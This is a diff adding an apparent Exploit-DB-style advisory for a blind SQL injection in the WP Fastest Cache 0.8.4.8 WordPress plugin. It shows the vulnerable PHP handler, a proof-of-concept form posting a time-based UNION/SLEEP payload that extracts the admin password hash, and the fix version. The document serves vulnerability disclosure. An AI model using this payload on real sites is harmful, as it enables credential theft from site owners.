@@ -1,0 +1,44 @@
+# Exploit Title: WP Fastest Cache 0.8.4.8 Blind SQL Injection
+# Date: 11-11-2015
+# Software Link: https://wordpress.org/plugins/wp-fastest-cache/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+ 
+1. Description
+   
+For this vulnerabilities also WP-Polls needs to be installed.
+
+Everyone can access wpfc_wppolls_ajax_request().
+
+$_POST["poll_id"] is not escaped properly.
+
+File: wp-fastest-cache\inc\wp-polls.php
+
+public function wpfc_wppolls_ajax_request() {
+	$id = strip_tags($_POST["poll_id"]);
+	$id = mysql_real_escape_string($id);
+
+	$result = check_voted($id);
+
+	if($result){
+		echo "true";
+	}else{
+		echo "false";
+	}
+	die();
+}
+
+http://security.szurek.pl/wp-fastest-cache-0848-blind-sql-injection.html
+
+2. Proof of Concept
+
+<form method="post" action="http://wordpress-url/wp-admin/admin-ajax.php?action=wpfc_wppolls_ajax_request">
+	<input type="text" name="poll_id" value="0 UNION (SELECT IF(substr(user_pass,1,1) = CHAR(36), SLEEP(5), 0) FROM `wp_users` WHERE ID = 1) -- ">
+	<input type="submit" value="Send">
+</form>
+
+3. Solution:
+   
+Update to version 0.8.4.9
